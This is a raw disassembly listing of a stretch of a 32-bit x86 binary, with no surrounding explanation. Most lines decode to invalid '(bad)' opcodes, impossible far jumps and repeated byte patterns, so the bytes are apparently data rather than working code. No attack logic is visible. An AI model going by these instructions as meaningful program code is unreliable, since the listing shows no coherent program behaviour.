  40ecc7:	push   ecx
  40ecc9:	jmp    0xe64a:0x4a6effea
  40ecd0:	add    BYTE PTR [eax],al
  40ecd2:	add    BYTE PTR [ebx+0x2e000000],cl
  40ecd8:	(bad)  
  40ecd9:	(bad)  
  40ecda:	inc    DWORD PTR [eax]
  40ecdc:	ins    BYTE PTR es:[edi],dx
  40ecdd:	ins    BYTE PTR es:[edi],dx
  40ecde:	ins    BYTE PTR es:[edi],dx
  40ecdf:	(bad)  
  40ece0:	retf   
  40ece1:	retf   
  40ece2:	retf   
  40ece3:	jmp    ebx
  40ece5:	jecxz  0x40ecca
  40ece7:	(bad)  
  40ece8:	fcmovnu st,st(4)
  40ecea:	fdiv   st(7),st
  40ecec:	jmp    0x40c2d0
  40ecf1:	out    0xce,al
  40ecf3:	call   ecx
  40ecf5:	fild   QWORD PTR [esi+0x47cc27ff]
  40ecfb:	push   DWORD PTR [edi]
  40ecfd:	rcl    BYTE PTR [edx-0x1],1
  40ed00:	and    BYTE PTR [esi-0x70f000cc],bh
  40ed06:	or     edi,edi
  40ed08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed09:	mov    BYTE PTR [ecx-0x1],bh
  40ed0c:	dec    ebx
  40ed0e:	into   
  40ed0f:	(bad)  
  40ed10:	inc    ebx
  40ed12:	ret    
  40ed13:	(bad)  
  40ed14:	(bad)  
  40ed15:	mov    ecx,0xb0ffffb9
  40ed1a:	mov    al,0xff
  40ed1c:	jmp    DWORD PTR [esi-0x2e00005b]
  40ed22:	fcos   
  40ed24:	jmp    ecx
  40ed26:	sti    
  40ed27:	(bad)  
  40ed28:	clc    
  40ed29:	mov    cl,0xcc
  40ed2b:	push   esp
  40ed2d:	mov    eax,0xe7ffffcf
  40ed32:	(bad)  
  40ed33:	(bad)  
  40ed34:	push   ebp
  40ed36:	(bad)  
  40ed37:	(bad)  
  40ed38:	(bad)  
  40ed39:	(bad)  
  40ed3a:	(bad)  
  40ed3b:	(bad)  
  40ed3c:	(bad)  
  40ed3d:	(bad)  
  40ed3e:	(bad)  
  40ed3f:	(bad)  
  40ed40:	std    
  40ed41:	cld    
  40ed42:	std    
  40ed43:	(bad)  
  40ed44:	std    
  40ed45:	cld    
  40ed46:	cld    
  40ed47:	(bad)  
  40ed48:	cld    
  40ed49:	sti    
  40ed4a:	sti    
  40ed4b:	jmp    FWORD PTR [ecx+0x14fa8686]
  40ed51:	or     eax,0xa40d
  40ed56:	add    BYTE PTR ds:0xffffff,bh
  40ed5c:	outs   dx,BYTE PTR ds:[esi]
  40ed5d:	outs   dx,BYTE PTR ds:[esi]
  40ed5e:	outs   dx,BYTE PTR ds:[esi]
  40ed5f:	(bad)  
  40ed60:	int    0xcd
  40ed62:	int    0xff
  40ed64:	in     eax,0xe5
  40ed66:	in     eax,0xff
  40ed68:	(bad)  
  40ed6a:	(bad)  
  40ed6c:	jmp    0xc5e1:0xffffd3de
  40ed73:	call   esp
  40ed75:	loopne 0x40ed25
  40ed77:	push   DWORD PTR [esi]
  40ed79:	fcomp  QWORD PTR [esi-0x1]
  40ed7c:	inc    esi
  40ed7d:	fild   QWORD PTR [eax-0x1]
  40ed80:	sub    al,cl
  40ed82:	inc    eax
  40ed83:	call   DWORD PTR [edx+ecx*4]
  40ed86:	add    edi,edi
  40ed88:	les    ebx,FWORD PTR [esi+edx*4-0x2a2c0001]
  40ed8f:	(bad)  
  40ed90:	dec    ebx
  40ed92:	retf   
  40ed93:	(bad)  
  40ed94:	inc    ebx
  40ed96:	ret    
  40ed97:	(bad)  
  40ed98:	push   DWORD PTR [esi-0x4100004a]
  40ed9e:	mov    ebp,0xfdf3ffff
  40eda3:	(bad)  
  40eda4:	in     al,dx
  40eda5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eda6:	mov    al,0xff
  40eda8:	mov    al,0x7d
  40edaa:	ja     0x40edab
  40edac:	mov    cl,0x7e
  40edae:	jne    0x40edaf
  40edb0:	shl    DWORD PTR [esi-0x6000045],cl
  40edb6:	(bad)  
  40edb7:	(bad)  
  40edb8:	sti    
  40edb9:	clc    
  40edba:	clc    
  40edbb:	push   esi
  40edbd:	lock out dx,al
  40edbf:	push   ebp
  40edc1:	out    dx,al
  40edc2:	in     eax,dx
  40edc3:	push   ebp
  40edc5:	out    dx,al
  40edc6:	in     al,dx
  40edc7:	(bad)  
  40edc8:	sti    
  40edc9:	div    ebp
  40edcb:	dec    ecx
  40edcd:	lods   al,BYTE PTR ds:[esi]
  40edce:	stos   DWORD PTR es:[edi],eax
  40edcf:	jmp    DWORD PTR [ebx]
  40edd1:	push   ss
  40edd2:	push   ss
  40edd3:	mov    al,0x0
  40edd5:	add    BYTE PTR [eax],al
  40edd7:	dec    ecx
  40edd8:	(bad)  
  40edd9:	(bad)  
  40edda:	inc    DWORD PTR [eax]
  40eddc:	outs   dx,DWORD PTR ds:[esi]
  40eddd:	outs   dx,DWORD PTR ds:[esi]
  40edde:	outs   dx,DWORD PTR ds:[esi]
  40eddf:	(bad)  
  40ede0:	iret   
  40ede1:	iret   
  40ede2:	iret   
  40ede3:	jmp    edi
  40ede5:	out    0xe7,eax
  40ede7:	(bad)  
  40ede8:	fnstsw ax
  40edea:	loop   0x40edeb
  40edec:	jmp    0x40edcc
  40edee:	sar    bh,cl
  40edf0:	(bad)  
  40edf1:	fnstsw WORD PTR [edi+edi*8-0x521f29]
  40edf8:	inc    ebp
  40edf9:	jmp    0xff7d:0xee54ff75
  40ee00:	xor    dl,bl
  40ee02:	dec    edi
  40ee03:	jmp    DWORD PTR [eax]
  40ee05:	test   DWORD PTR [edx-0x1],eax
  40ee08:	retf   
  40ee09:	pushf  
  40ee0a:	lahf   
  40ee0b:	(bad)  
  40ee0c:	call   ebx
  40ee0e:	aam    0xff
  40ee10:	dec    ebp
  40ee12:	int    0xff
  40ee14:	dec    ebx
  40ee16:	retf   
  40ee17:	(bad)  
  40ee18:	inc    ebx
  40ee1a:	ret    
  40ee1b:	(bad)  
  40ee1c:	call   ecx
  40ee1e:	sar    bh,1
  40ee20:	push   esp
  40ee22:	cld    
  40ee23:	inc    esi
  40ee25:	xchg   BYTE PTR [edi-0x33335d01],al
  40ee2b:	push   edi
  40ee2d:	loopne 0x40eded
  40ee2f:	jmp    FWORD PTR [ebp-0x800837e]
  40ee35:	out    dx,al
  40ee36:	repnz push edi
  40ee39:	repz repnz (bad) 
  40ee3c:	jmp    0xdfe2:0xebffdfe2
  40ee43:	(bad)  
  40ee44:	jmp    0x40ee28
  40ee46:	(bad)  
  40ee48:	lock jmp 0xb610ee33
  40ee4e:	mov    ah,0xff
  40ee50:	inc    edx
  40ee51:	sub    ebp,DWORD PTR [ebx]
  40ee53:	ret    0x0
  40ee56:	add    BYTE PTR [ebp-0x1],cl
  40ee59:	(bad)  
  40ee5a:	inc    DWORD PTR [eax]
  40ee5c:	jno    0x40eecf
  40ee5e:	jno    0x40eec2
  40ee60:	rcl    ecx,1
  40ee62:	sar    edi,1
  40ee64:	jmp    0xe340d852
  40ee69:	jecxz  0x40ee4f
  40ee6b:	(bad)  
  40ee6c:	in     eax,dx
  40ee6d:	(bad)  
  40ee6f:	(bad)  
  40ee70:	(bad)  
  40ee71:	fnstenv [edi+edi*8-0x541d25]
  40ee78:	push   esp
  40ee79:	sti    
  40ee7a:	mov    edi,?
  40ee7c:	pop    esi
  40ee7d:	repnz cdq 
  40ee7f:	dec    DWORD PTR [ecx+edx*8-0x3f]
  40ee83:	(bad)  
  40ee84:	cmp    al,0x81
  40ee86:	fdivr  st,st(7)
  40ee88:	mov    ebx,0xffff958c
  40ee8d:	int    0xcc
  40ee8f:	(bad)  
  40ee90:	dec    esp
  40ee92:	int3   
  40ee93:	(bad)  
  40ee94:	dec    esp
  40ee96:	int3   
  40ee97:	(bad)  
  40ee98:	dec    ecx
  40ee9a:	leave  
  40ee9b:	(bad)  
  40ee9c:	call   edi
  40ee9e:	(bad)  
  40ee9f:	(bad)  
  40eea0:	push   edi
  40eea2:	(bad)  
  40eea3:	call   esi
  40eea5:	stos   DWORD PTR es:[edi],eax
  40eea6:	lods   eax,DWORD PTR ds:[esi]
  40eea7:	jmp    DWORD PTR [eax-0xc005454]
  40eead:	shl    DWORD PTR [eax+0x737ab2ff],cl
  40eeb3:	(bad)  
  40eeb4:	cld    
  40eeb5:	aam    0xd9
  40eeb7:	(bad)  
  40eeb8:	std    
  40eeb9:	loop   0x40ee9e
  40eebb:	(bad)  
  40eebc:	cli    
  40eebd:	mov    eax,0xc4f6ffb7
  40eec2:	ret    
  40eec3:	push   esi
  40eec5:	retf   0xffc9
  40eec8:	clc    
  40eec9:	(bad)  
  40eeca:	aam    0xff
  40eecc:	aam    0xb0
  40eece:	scas   eax,DWORD PTR es:[edi]
  40eecf:	inc    DWORD PTR [ecx+0x2b]
  40eed2:	sub    eax,eax
  40eed4:	add    BYTE PTR [eax],al
  40eed6:	add    BYTE PTR [ecx-0x1],cl
  40eed9:	(bad)  
  40eeda:	inc    DWORD PTR [eax]
  40eedc:	jb     0x40ef50
  40eede:	jb     0x40ef42
  40eee0:	rcl    dl,cl
  40eee2:	sar    bh,cl
  40eee4:	jmp    0xe8e6:0xe3ffebeb
  40eeeb:	(bad)  
  40eeec:	out    dx,eax
  40eeed:	(bad)  
  40eeef:	(bad)  
  40eef0:	call   edi
  40eef2:	stos   BYTE PTR es:[edi],al
  40eef3:	call   esi
  40eef5:	aam    0xb7
  40eef7:	inc    DWORD PTR [eax-0x3e]
  40eefa:	loopne 0x40eefb
  40eefc:	dec    edx
  40eefd:	mov    bl,0xfb
  40eeff:	dec    DWORD PTR [ebx+esi*4-0x1]
  40ef03:	push   DWORD PTR [esi]
  40ef05:	xchg   cl,ch
  40ef07:	call   FWORD PTR [ebp-0x7183]
  40ef0d:	retf   
  40ef0e:	enter  0xffff,0xca
  40ef12:	retf   0xffff
  40ef15:	retf   
  40ef16:	retf   
  40ef17:	(bad)  
  40ef18:	call   esi
  40ef1a:	(bad)  
  40ef1b:	(bad)  
  40ef1c:	(bad)  
  40ef1d:	jmp    0xffff:0xf5ffffe9
  40ef24:	sti    
  40ef25:	in     al,dx
  40ef26:	sti    
  40ef27:	dec    ebx
  40ef29:	mov    eax,ds:0x76b2ff9e
  40ef2e:	jno    0x40ef2f
  40ef30:	fst    QWORD PTR [eax+ebx*4-0x80f0001]
  40ef37:	(bad)  
  40ef38:	inc    ebp
  40ef3a:	(bad)  
  40ef3b:	(bad)  
  40ef3c:	jmp    DWORD PTR [esi-0x4d00005b]
  40ef42:	mov    dl,0xff
  40ef44:	(bad)  
  40ef45:	mov    edx,0xcaffffba
  40ef4a:	retf   0xdaff
  40ef4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef4f:	inc    DWORD PTR [ebp+ebp*1+0x2d]
  40ef53:	mov    ebp,0x3d000000
  40ef58:	(bad)  
  40ef59:	(bad)  
  40ef5a:	inc    DWORD PTR [eax]
  40ef5c:	je     0x40efd2
  40ef5e:	je     0x40efc2
  40ef60:	aam    0xd6
  40ef62:	fdivr  st,st(7)
  40ef64:	in     eax,dx
  40ef65:	out    dx,eax
  40ef66:	icebp  
  40ef67:	jmp    edi
  40ef69:	jecxz  0x40ef45
  40ef6b:	(bad)  
  40ef6c:	out    dx,eax
  40ef6d:	fmulp  st(5),st
  40ef6f:	(bad)  
  40ef70:	call   esp
  40ef72:	mov    al,ds:0xbcc6d2ff
  40ef77:	jmp    DWORD PTR [edi]
  40ef79:	cwde   
  40ef7a:	(bad)  
  40ef7b:	push   DWORD PTR [ebx]
  40ef7d:	mov    ds:0xae40ffff,eax
  40ef82:	(bad)  
  40ef83:	jmp    FWORD PTR [ecx]
  40ef85:	mov    ecx,?
  40ef87:	push   DWORD PTR [esi+0x66]
  40ef8a:	mov    bh,bh
  40ef8c:	cld    
  40ef8d:	leave  
  40ef8e:	ret    
  40ef8f:	(bad)  
  40ef90:	jmp    ebx
  40ef92:	jecxz  0x40ef93
  40ef94:	push   ebp
  40ef96:	cmc    
  40ef97:	(bad)  
  40ef98:	(bad)  
  40ef99:	std    
  40ef9a:	std    
  40ef9b:	(bad)  
  40ef9c:	(bad)  
  40ef9d:	(bad)  
  40ef9e:	(bad)  
  40ef9f:	(bad)  
  40efa0:	(bad)  
  40efa1:	cld    
  40efa2:	(bad)  
  40efa3:	(bad)  
  40efa4:	jmp    edi
  40efa6:	(bad)  
  40efa7:	(bad)  
  40efa8:	call   ecx
  40efaa:	cli    
  40efab:	(bad)  
  40efac:	cli    
  40efad:	ret    0xffe1
  40efb0:	jmp    ebx
  40efb2:	std    
  40efb3:	(bad)  
  40efb4:	(bad)  
  40efb5:	fsubrp st(7),st
  40efb7:	(bad)  
  40efb8:	call   FWORD PTR [esi-0x60000063]
  40efbe:	lahf   
  40efbf:	(bad)  
  40efc0:	jmp    FWORD PTR [edx-0x4d000056]
  40efc6:	mov    dl,0xff
  40efc8:	inc    eax
  40efca:	sar    bh,0xc9
  40efcd:	xchg   ebx,eax
  40efce:	xchg   ebx,eax
  40efcf:	jmp    FWORD PTR [ecx]
  40efd1:	sbb    ebx,DWORD PTR [ebx]
  40efd3:	lahf   
  40efd4:	add    BYTE PTR [eax],al
  40efd6:	add    BYTE PTR ds:0xffffff,ch
  40efdc:	jne    0x40f054
  40efde:	ja     0x40f042
  40efe0:	xlat   BYTE PTR ds:[ebx]
  40efe1:	ror    ebx,cl
  40efe3:	(bad)  
  40efe4:	cli    
  40efe5:	mov    ebx,0xb8f2ff5b
  40efea:	gs (bad) 
  40efec:	out    dx,eax
  40efed:	(bad)  
  40efef:	(bad)  
  40eff0:	dec    edi
  40eff2:	pushf  
  40eff3:	push   edx
  40eff5:	int3   
  40eff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eff7:	push   DWORD PTR [eax-0x6b003a45]
  40effd:	mov    dh,0xd4
  40efff:	(bad)  
  40f000:	jnp    0x40efb8
  40f002:	jecxz  0x40f003
  40f004:	push   ecx
  40f005:	call   0xffa3:0x5544ffeb
  40f00c:	into   
  40f00d:	mov    ch,0xb5
  40f00f:	(bad)  
  40f010:	(bad)  
  40f011:	(bad)  
  40f012:	(bad)  
  40f013:	(bad)  
  40f014:	(bad)  
  40f015:	(bad)  
  40f016:	(bad)  
  40f017:	(bad)  
  40f018:	(bad)  
  40f019:	(bad)  
  40f01a:	(bad)  
  40f01b:	(bad)  
  40f01c:	(bad)  
  40f01d:	(bad)  
  40f01e:	(bad)  
  40f01f:	(bad)  
  40f020:	(bad)  
  40f021:	(bad)  
  40f022:	(bad)  
  40f023:	(bad)  
  40f024:	push   ebx
  40f026:	idiv   edi
  40f028:	dec    ebx
  40f02a:	call   0xec0df02e
  40f02f:	(bad)  
  40f030:	dec    ecx
  40f032:	fdivr  st,st(7)
  40f034:	jmp    FWORD PTR [edx-0x63000055]
  40f03a:	pushf  
  40f03b:	(bad)  
  40f03c:	call   FWORD PTR [ecx-0x5f000067]
  40f042:	mov    al,ds:0xaaaaffff
  40f047:	(bad)  
  40f048:	std    
  40f049:	mov    dl,0xb2
  40f04b:	jmp    DWORD PTR [esi+0x18f77373]
  40f051:	adc    BYTE PTR [eax],dl
  40f053:	jne    0x40f055
  40f055:	add    BYTE PTR [eax],al
  40f057:	sbb    edi,edi
  40f059:	(bad)  
  40f05a:	inc    DWORD PTR [eax]
  40f05c:	ja     0x40f0d8
  40f05e:	and    BYTE PTR [edx-0x22],0xc4
  40f062:	sahf   
  40f063:	(bad)  
  40f064:	sti    
  40f065:	mov    WORD PTR [eax],es
  40f067:	(bad)  
  40f068:	jmp    0xf240531d
  40f06d:	loope  0x40f040
  40f06f:	(bad)  
  40f070:	dec    ebx
  40f072:	xchg   esi,eax
  40f073:	(bad)  
  40f074:	dec    ebp
  40f076:	cdq    
  40f077:	(bad)  
  40f078:	dec    edi
  40f07a:	xchg   esp,eax
  40f07b:	(bad)  
  40f07c:	dec    edi
  40f07e:	xchg   esp,eax
  40f07f:	(bad)  
  40f080:	dec    esp
  40f082:	call   0xe0ff:0x9fc9f3ff
  40f089:	mov    eax,ds:0x80b2ff9a
  40f08e:	cmp    bh,0xf7
  40f091:	hlt    
  40f092:	hlt    
  40f093:	(bad)  
  40f094:	(bad)  
  40f095:	(bad)  
  40f096:	(bad)  
  40f097:	(bad)  
  40f098:	(bad)  
  40f099:	(bad)  
  40f09a:	(bad)  
  40f09b:	(bad)  
  40f09c:	(bad)  
  40f09d:	(bad)  
  40f09e:	(bad)  
  40f09f:	(bad)  
  40f0a0:	(bad)  
  40f0a1:	(bad)  
  40f0a2:	(bad)  
  40f0a3:	(bad)  
  40f0a4:	(bad)  
  40f0a5:	call   0xc840f090
  40f0aa:	(bad)  
  40f0ad:	ret    0xffc1
  40f0b0:	push   DWORD PTR [edi-0x4f00004b]
  40f0b6:	mov    al,0xff
  40f0b8:	jmp    FWORD PTR [eax-0x61000058]
  40f0be:	sahf   
  40f0bf:	(bad)  
  40f0c0:	call   FWORD PTR [ecx-0x5d000067]
  40f0c6:	mov    ds:0x9d9deeff,al
  40f0cb:	push   DWORD PTR [ebx+0x4c]
  40f0ce:	dec    esp
  40f0cf:	xlat   BYTE PTR ds:[ebx]
  40f0d0:	add    al,BYTE PTR [edx]
  40f0d2:	add    al,BYTE PTR [ecx+0x0]
  40f0d5:	add    BYTE PTR [eax],al
  40f0d7:	or     edi,edi
  40f0d9:	(bad)  
  40f0da:	inc    DWORD PTR [eax]
  40f0dc:	jns    0x40f15b
  40f0de:	and    DWORD PTR [edx-0x25],0xebff9dc1
  40f0e5:	add    DWORD PTR [eax],0x62a8e2ff
  40f0eb:	push   ebx
  40f0ed:	loope  0x40f0be
  40f0ef:	(bad)  
  40f0f0:	inc    edi
  40f0f2:	mov    bh,bh
  40f0f4:	dec    ecx
  40f0f6:	(bad)  
  40f0f7:	(bad)  
  40f0f8:	dec    ecx
  40f0fa:	(bad)  
  40f0fb:	(bad)  
  40f0fc:	dec    ecx
  40f0fe:	(bad)  
  40f0ff:	(bad)  
  40f100:	dec    ecx
  40f102:	mov    ?,edi
  40f104:	dec    edx
  40f106:	mov    ?,edi
  40f108:	dec    ecx
  40f10a:	nop
  40f10b:	call   edx
  40f10d:	lea    edi,[edi+edi*8-0x42]
  40f111:	mov    al,ds:0xffffffa4
  40f116:	(bad)  
  40f117:	(bad)  
  40f118:	(bad)  
  40f119:	(bad)  
  40f11a:	(bad)  
  40f11b:	(bad)  
  40f11c:	(bad)  
  40f11d:	(bad)  
  40f11e:	(bad)  
  40f11f:	(bad)  
  40f120:	(bad)  
  40f121:	(bad)  
  40f122:	(bad)  
  40f123:	(bad)  
  40f124:	(bad)  
  40f125:	(bad)  
  40f127:	(bad)  
  40f128:	dec    edi
  40f12a:	iret   
  40f12b:	(bad)  
  40f12c:	dec    ebx
  40f12e:	retf   0xffff
  40f131:	ret    
  40f132:	ret    
  40f133:	(bad)  
  40f134:	(bad)  
  40f135:	mov    edx,0xb1ffffba
  40f13a:	mov    cl,0xff
  40f13c:	jmp    DWORD PTR [edi-0x61000059]
  40f142:	sahf   
  40f143:	(bad)  
  40f144:	call   FWORD PTR [esp+ebx*4+0x7878b9ff]
  40f14b:	std    
  40f14c:	cmp    al,0x28
  40f14e:	sub    BYTE PTR [eax+0x1b000000],al
  40f154:	add    BYTE PTR [eax],al
  40f156:	add    BYTE PTR [edx],al
  40f158:	(bad)  
  40f159:	(bad)  
  40f15a:	inc    DWORD PTR [eax]
  40f15c:	jnp    0x40f1dd
  40f15e:	and    BYTE PTR [edx-0x28],0xbd
  40f162:	fwait
  40f163:	(bad)  
  40f164:	fnsave [ecx+0x0]
  40f167:	jmp    eax
  40f169:	lods   eax,DWORD PTR ds:[esi]
  40f16a:	js     0x40f16b
  40f16c:	cmc    
  40f16d:	loope  0x40f138
  40f16f:	(bad)  
  40f170:	inc    eax
  40f172:	jbe    0x40f173
  40f174:	inc    edx
  40f176:	jnp    0x40f177
  40f178:	inc    edx
  40f17a:	jnp    0x40f17b
  40f17c:	inc    edx
  40f17e:	jnp    0x40f17f
  40f180:	inc    edx
  40f182:	jnp    0x40f183
  40f184:	inc    edx
  40f186:	jnp    0x40f187
  40f188:	inc    esp
  40f18a:	jnp    0x40f18b
  40f18c:	inc    ecx
  40f18e:	jg     0x40f18f
  40f190:	mov    esp,0xc9ff6c81
  40f195:	mov    ah,0xb8
  40f197:	(bad)  
  40f198:	(bad)  
  40f199:	(bad)  
  40f19a:	(bad)  
  40f19b:	(bad)  
  40f19c:	(bad)  
  40f19d:	(bad)  
  40f19e:	(bad)  
  40f19f:	(bad)  
  40f1a0:	push   edi
  40f1a2:	idiv   edi
  40f1a4:	(bad)  
  40f1a5:	(bad)  
  40f1a7:	(bad)  
  40f1a8:	call   edi
  40f1aa:	xlat   BYTE PTR ds:[ebx]
  40f1ab:	(bad)  
  40f1ac:	call   eax
  40f1ae:	sar    bh,1
  40f1b0:	dec    ebx
  40f1b2:	retf   
  40f1b3:	(bad)  
  40f1b4:	inc    ebx
  40f1b6:	ret    
  40f1b7:	(bad)  
  40f1b8:	(bad)  
  40f1b9:	mov    ecx,0xb1ffffb9
  40f1be:	mov    cl,0xff
  40f1c0:	jmp    FWORD PTR [esp+ebp*4-0x79792b01]
  40f1c7:	jmp    FWORD PTR [ebp+0x49]
  40f1ca:	dec    ecx
  40f1cb:	mov    ebx,0x28000000
  40f1d0:	add    BYTE PTR [eax],al
  40f1d2:	add    BYTE PTR [esi],al
  40f1d4:	add    BYTE PTR [eax],al
  40f1d6:	add    BYTE PTR [eax],al
  40f1d8:	(bad)  
  40f1d9:	(bad)  
  40f1da:	inc    DWORD PTR [eax]
  40f1dc:	jl     0x40f25d
  40f1de:	and    DWORD PTR [edx-0x25],0xe2ffb2c7
  40f1e5:	mov    edx,0xd9d9ff8f
  40f1ea:	fcos   
  40f1ec:	cmc    
  40f1ed:	fnstsw WORD PTR [esi+0x64baffff]
  40f1f3:	(bad)  
  40f1f4:	(bad)  
  40f1f5:	mov    esp,0xbbffff68
  40f1fa:	addr16 (bad) 
  40f1fc:	(bad)  
  40f1fd:	mov    esp,0xbcffff68
  40f202:	push   0xffffffff
  40f204:	(bad)  
  40f205:	mov    ebp,0xbdffff6c
  40f20a:	ins    BYTE PTR es:[edi],dx
  40f20b:	(bad)  
  40f20c:	(bad)  
  40f20d:	mov    esi,0xbaf9ff6b
  40f212:	imul   edi,edi,0xff6482b8
  40f218:	lds    ebp,FWORD PTR [ebx-0x3030053]
  40f21e:	(bad)  
  40f21f:	(bad)  
  40f220:	push   edi
  40f222:	idiv   edi
  40f224:	(bad)  
  40f225:	call   0xe240f212
  40f22a:	loope  0x40f22b
  40f22c:	(bad)  
  40f22d:	fcomp  st(0)
  40f22f:	(bad)  
  40f230:	call   eax
  40f232:	sar    bh,1
  40f234:	dec    esp
  40f236:	int3   
  40f237:	(bad)  
  40f238:	inc    esi
  40f23a:	(bad)  
  40f23b:	(bad)  
  40f23c:	(bad)  
  40f23d:	mov    ebp,0x8fd2ffbd
  40f242:	(bad)  
  40f243:	inc    DWORD PTR [eax+0xecd5757]
  40f249:	or     cl,BYTE PTR [edx]
  40f24b:	sub    al,BYTE PTR [eax]
  40f24d:	add    BYTE PTR [eax],al
  40f24f:	pop    es
  40f250:	add    BYTE PTR [eax],al
  40f252:	add    BYTE PTR [ecx],al
  40f254:	add    BYTE PTR [eax],al
  40f256:	add    BYTE PTR [eax],al
  40f258:	(bad)  
  40f259:	(bad)  
  40f25a:	inc    DWORD PTR [eax]
  40f25c:	add    BYTE PTR [eax-0x2d2d9d80],0xd2
  40f263:	(bad)  
  40f264:	mov    edx,0xc9ffc3bf
  40f269:	int3   
  40f26a:	sar    edi,1
  40f26c:	neg    ebx
  40f26e:	mov    eax,0x46b0ffff
  40f273:	(bad)  
  40f274:	(bad)  
  40f275:	stos   BYTE PTR es:[edi],al
  40f276:	das    
  40f277:	(bad)  
  40f278:	std    
  40f279:	scas   eax,DWORD PTR es:[edi]
  40f27a:	inc    eax
  40f27b:	(bad)  
  40f27c:	(bad)  
  40f27d:	scas   eax,DWORD PTR es:[edi]
  40f27e:	inc    eax
  40f27f:	(bad)  
  40f280:	(bad)  
  40f281:	lods   eax,DWORD PTR ds:[esi]
  40f282:	cmp    edi,edi
  40f284:	jmp    FWORD PTR [ebp-0x510000c3]
  40f28a:	aas    
  40f28b:	(bad)  
  40f28c:	push   DWORD PTR [edx-0x490000b6]
  40f292:	push   ebx
  40f293:	(bad)  
  40f294:	(bad)  
  40f295:	mov    eax,0x8ac6ff5b
  40f29a:	pop    edx
  40f29b:	push   DWORD PTR [edx-0x27007a77]
  40f2a1:	ret    
  40f2a2:	retf   
  40f2a3:	push   ebx
  40f2a5:	loopne 0x40f28b
  40f2a7:	(bad)  
  40f2a8:	(bad)  
  40f2a9:	out    0xe7,al
  40f2ab:	(bad)  
  40f2ac:	jmp    ebx
  40f2ae:	jecxz  0x40f2af
  40f2b0:	(bad)  
  40f2b1:	fcmovu st,st(2)
  40f2b3:	(bad)  
  40f2b4:	sti    
  40f2b5:	int3   
  40f2b6:	int3   
  40f2b7:	(bad)  
  40f2b8:	jmp    0x40f270
  40f2ba:	mov    dh,0xff
  40f2bc:	mov    dh,0x81
  40f2be:	cmp    eax,0xa252527a
  40f2c4:	sbb    DWORD PTR [ecx],edx
  40f2c6:	adc    DWORD PTR [esi],ebx
  40f2c8:	add    BYTE PTR [eax],al
  40f2ca:	add    BYTE PTR ds:0x1000000,al
	...
  40f2d8:	(bad)  
  40f2d9:	(bad)  
  40f2da:	inc    DWORD PTR [eax]
  40f2dc:	add    DWORD PTR [ecx-0x2e2e9d7f],0xbbbbffd1
  40f2e6:	mov    ebx,0xcdcac7ff
  40f2eb:	push   edi
  40f2ed:	xlat   BYTE PTR ds:[ebx]
  40f2ee:	lods   eax,DWORD PTR ds:[esi]
  40f2ef:	(bad)  
  40f2f0:	(bad)  
  40f2f1:	lods   eax,DWORD PTR ds:[esi]
  40f2f2:	cmp    edi,edi
  40f2f4:	imul   dl
  40f2f6:	(bad)  
  40f2f7:	push   ebx
  40f2f9:	icebp  
  40f2fa:	out    dx,eax
  40f2fb:	push   edx
  40f2fd:	jecxz  0x40f2cd
  40f2ff:	push   edx
  40f301:	(bad)  
  40f302:	stos   BYTE PTR es:[edi],al
  40f303:	push   edx
  40f305:	retf   0xff8d
  40f308:	hlt    
  40f309:	mov    edi,0xb9f6ff71
  40f30e:	pusha  
  40f30f:	(bad)  
  40f310:	cli    
  40f311:	scas   al,BYTE PTR es:[edi]
  40f312:	inc    ecx
  40f313:	(bad)  
  40f314:	(bad)  
  40f315:	test   al,0x2c
  40f317:	(bad)  
  40f318:	jmp    FWORD PTR [eax-0x621200de]
  40f31e:	xor    edi,edi
  40f320:	enter  0x3d80,0xff
  40f324:	mov    edi,0xbeff6a89
  40f329:	xchg   ecx,eax
  40f32a:	test   edi,edi
  40f32c:	mov    dh,0x8d
  40f32e:	(bad)  
  40f32f:	push   DWORD PTR [edx-0x69027677]
  40f335:	ins    BYTE PTR es:[edi],dx
  40f336:	ins    BYTE PTR es:[edi],dx
  40f337:	in     al,dx
  40f338:	ins    DWORD PTR es:[edi],dx
  40f339:	dec    esp
  40f33a:	dec    esp
  40f33b:	mov    eax,0x6034344f
  40f340:	add    BYTE PTR [eax],al
  40f342:	add    BYTE PTR [ecx],bl
  40f344:	add    BYTE PTR [eax],al
  40f346:	add    BYTE PTR ds:0xffffff,al
	...
  40f358:	(bad)  
  40f359:	(bad)  
  40f35a:	inc    DWORD PTR [eax]
  40f35c:	add    BYTE PTR [edx-0x28289d7e],0xd7
  40f363:	jmp    edx
  40f365:	loop   0x40f349
  40f367:	push   esi
  40f369:	clc    
  40f36a:	sti    
  40f36b:	(bad)  
  40f36c:	std    
  40f36d:	loope  0x40f326
  40f36f:	(bad)  
  40f370:	(bad)  
  40f371:	in     al,dx
  40f372:	(bad)  
  40f375:	(bad)  
  40f376:	(bad)  
  40f377:	(bad)  
  40f378:	clc    
  40f379:	cli    
  40f37a:	cld    
  40f37b:	push   esp
  40f37d:	idiv   ebx
  40f37f:	(bad)  
  40f380:	out    dx,eax
  40f381:	hlt    
  40f382:	sti    
  40f383:	(bad)  
  40f384:	in     al,dx
  40f385:	repnz cld 
  40f387:	(bad)  
  40f388:	jmp    0xe940e77a
  40f38d:	call   0xe227f379
  40f392:	fcos   
  40f394:	jecxz  0x40f371
  40f396:	into   
  40f397:	jmp    ebp
  40f399:	shl    DWORD PTR [ebx-0x71381201],1
  40f39f:	push   edx
  40f3a1:	mov    esi,0xabeeff6c
  40f3a6:	dec    ecx
  40f3a7:	(bad)  
  40f3a8:	jmp    0x40f348
  40f3aa:	xor    edi,edi
  40f3ac:	in     al,dx
  40f3ad:	popf   
  40f3ae:	sub    edi,edi
  40f3b0:	mov    BYTE PTR [edx+0x5c],dh
  40f3b3:	repnz sbb al,0x15
  40f3b6:	push   ss
  40f3b7:	mov    esp,0x91000000
  40f3bc:	add    BYTE PTR [eax],al
  40f3be:	add    BYTE PTR [eax+eax*1+0x0],ah
  40f3c2:	add    BYTE PTR [eax+eax*1],ch
  40f3c5:	add    BYTE PTR [eax],al
  40f3c7:	or     BYTE PTR [eax],al
	...
  40f3d5:	add    BYTE PTR [eax],al
  40f3d7:	add    bh,bh
  40f3d9:	(bad)  
  40f3da:	inc    DWORD PTR [eax]
  40f3dc:	add    DWORD PTR [ecx-0x17179d7f],0xffffffe8
  40f3e6:	(bad)  
  40f3e7:	(bad)  
  40f3e8:	jmp    0xb2b7:0xcaffebeb
